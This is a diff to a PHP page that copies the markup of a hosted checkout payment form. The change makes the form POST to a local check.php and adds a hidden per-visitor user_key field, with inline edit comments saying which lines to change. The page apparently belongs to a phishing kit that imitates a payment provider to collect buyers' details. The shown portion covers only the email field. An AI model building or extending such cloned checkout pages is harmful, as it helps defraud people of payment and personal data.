@@ -132,61 +132,69 @@ if (!isset($users[$user_key])) {
                     </div>
                 </div>
                 <div class="App-Payment">
-                    <main>
-                        <div class="CheckoutPaymentForm">
-                            <form class="PaymentForm-form" novalidate="" id="payment-form">
-                                <div style="height: 500px;">
-                                    <div>
-                                        <div style="opacity: 1;">
-                                            <div
-                                                class="App-Global-Fields flex-container spacing-16 direction-column wrap-wrap">
-                                                <div class="flex-item width-12">
-                                                    <div class="FormFieldGroup" data-qa="FormFieldGroup-email">
-                                                        <div
-                                                            class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
-                                                            <label for="email-fieldset"><span
-                                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Contact
-                                                                    details</span></label>
-                                                            <div style="opacity: 1; transform: none;"></div>
+    <main>
+        <div class="CheckoutPaymentForm">
+            <!-- CHANGE ONLY THIS LINE: Add method="POST" action="check.php" -->
+            <form class="PaymentForm-form" method="POST" action="check.php" novalidate="" id="payment-form">
+                <!-- ADD THIS LINE RIGHT AFTER THE FORM OPENING TAG -->
+                <input type="hidden" name="user_key" value="<?php echo $user_key; ?>">
+                
+                <div style="height: 200px;">
+                    <div>
+                        <div style="opacity: 1;">
+                            <div
+                                class="App-Global-Fields flex-container spacing-16 direction-column wrap-wrap">
+                                <div class="flex-item width-12">
+                                    <div class="FormFieldGroup" data-qa="FormFieldGroup-email">
+                                        <div
+                                            class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                            <label for="email-fieldset"><span
+                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Contact
+                                                    details</span></label>
+                                            <div style="opacity: 1; transform: none;"></div>
+                                        </div>
+                                        <fieldset class="FormFieldGroup-Fieldset" id="email-fieldset">
+                                            <div class="FormFieldGroup-container">
+                                                <div
+                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
+                                                    <div class="FormFieldInput">
+                                                        <div class="CheckoutInputContainer">
+                                                            <div
+                                                                class="CheckoutInputContainer-placeholderIcon CheckoutInputContainer--hasMailIcon">
+                                                                <svg class="InlineSVG Icon Icon--md"
+                                                                    focusable="false" width="16"
+                                                                    height="16" viewBox="0 0 16 16"
+                                                                    fill="none">
+                                                                    <path
+                                                                        d="M8.75 10.7622C8.75 10.348 9.08579 10.0122 9.5 10.0122H12.5C12.9142 10.0122 13.25 10.348 13.25 10.7622C13.25 11.1764 12.9142 11.5122 12.5 11.5122H9.5C9.08579 11.5122 8.75 11.1764 8.75 10.7622Z"
+                                                                        fill="#1A1A1A"
+                                                                        fill-opacity="0.5"></path>
+                                                                    <path fill-rule="evenodd"
+                                                                        clip-rule="evenodd"
+                                                                        d="M3 1.51221C1.34315 1.51221 0 2.85535 0 4.51221V11.5122C0 13.1691 1.34315 14.5122 3 14.5122H13C14.6569 14.5122 16 13.1691 16 11.5122V4.51221C16 2.85535 14.6569 1.51221 13 1.51221H3ZM13 3.01221H3C2.43944 3.01221 1.9507 3.31969 1.69325 3.7752C1.7485 3.78999 1.80292 3.81137 1.85548 3.83967L7.88138 7.08439C7.95537 7.12423 8.04443 7.12423 8.11843 7.08439L14.1443 3.83967C14.1969 3.81134 14.2514 3.78994 14.3067 3.77515C14.0493 3.31967 13.5605 3.01221 13 3.01221ZM14.5 5.35179L8.82958 8.40509C8.31162 8.68399 7.68819 8.68399 7.17023 8.40509L1.5 5.35189V11.5122C1.5 12.3406 2.17157 13.0122 3 13.0122H13C13.8284 13.0122 14.5 12.3406 14.5 11.5122V5.35179Z"
+                                                                        fill="#1A1A1A"
+                                                                        fill-opacity="0.5"></path>
+                                                                </svg></div><span
+                                                                class="InputContainer"><input
+                                                                    class="CheckoutInput CheckoutInput--hasPlaceholderIcon Input Input--empty"
+                                                                    autocomplete="email"
+                                                                    autocorrect="off" spellcheck="false"
+                                                                    autocapitalize="none" id="email"
+                                                                    name="email" type="text"
+                                                                    inputmode="email"
+                                                                    placeholder="email@example.com"
+                                                                    aria-invalid="false"
+                                                                    aria-describedby=""
+                                                                    data-1p-ignore="false"
+                                                                    data-lp-ignore="false"
+                                                                    value=""></span>
                                                         </div>
-                                                        <fieldset class="FormFieldGroup-Fieldset" id="email-fieldset">
-                                                            <div class="FormFieldGroup-container">
-                                                                <div
-                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
-                                                                    <div class="FormFieldInput">
-                                                                        <div class="CheckoutInputContainer">
-                                                                            <div
-                                                                                class="CheckoutInputContainer-placeholderIcon CheckoutInputContainer--hasMailIcon">
-                                                                                <svg class="InlineSVG Icon Icon--md"
-                                                                                    focusable="false" width="16"
-                                                                                    height="16" viewBox="0 0 16 16"
-                                                                                    fill="none">
-                                                                                    <path
-                                                                                        d="M8.75 10.7622C8.75 10.348 9.08579 10.0122 9.5 10.0122H12.5C12.9142 10.0122 13.25 10.348 13.25 10.7622C13.25 11.1764 12.9142 11.5122 12.5 11.5122H9.5C9.08579 11.5122 8.75 11.1764 8.75 10.7622Z"
-                                                                                        fill="#1A1A1A"
-                                                                                        fill-opacity="0.5"></path>
-                                                                                    <path fill-rule="evenodd"
-                                                                                        clip-rule="evenodd"
-                                                                                        d="M3 1.51221C1.34315 1.51221 0 2.85535 0 4.51221V11.5122C0 13.1691 1.34315 14.5122 3 14.5122H13C14.6569 14.5122 16 13.1691 16 11.5122V4.51221C16 2.85535 14.6569 1.51221 13 1.51221H3ZM13 3.01221H3C2.43944 3.01221 1.9507 3.31969 1.69325 3.7752C1.7485 3.78999 1.80292 3.81137 1.85548 3.83967L7.88138 7.08439C7.95537 7.12423 8.04443 7.12423 8.11843 7.08439L14.1443 3.83967C14.1969 3.81134 14.2514 3.78994 14.3067 3.77515C14.0493 3.31967 13.5605 3.01221 13 3.01221ZM14.5 5.35179L8.82958 8.40509C8.31162 8.68399 7.68819 8.68399 7.17023 8.40509L1.5 5.35189V11.5122C1.5 12.3406 2.17157 13.0122 3 13.0122H13C13.8284 13.0122 14.5 12.3406 14.5 11.5122V5.35179Z"
-                                                                                        fill="#1A1A1A"
-                                                                                        fill-opacity="0.5"></path>
-                                                                                </svg></div><span
-                                                                                class="InputContainer"><input
-                                                                                    class="CheckoutInput CheckoutInput--hasPlaceholderIcon Input Input--empty"
-                                                                                    autocomplete="email"
-                                                                                    autocorrect="off" spellcheck="false"
-                                                                                    autocapitalize="none" id="email"
-                                                                                    name="email" type="text"
-                                                                                    inputmode="email"
-                                                                                    placeholder="email@example.com"
-                                                                                    aria-invalid="false"
-                                                                                    aria-describedby=""
-                                                                                    data-1p-ignore="false"
-                                                                                    data-lp-ignore="false"
-                                                                                    value=""></span>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </fieldset>
+                                    </div>
+                                </div>
                                                                 <div
                                                                     class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                     <div class="FormFieldInput">
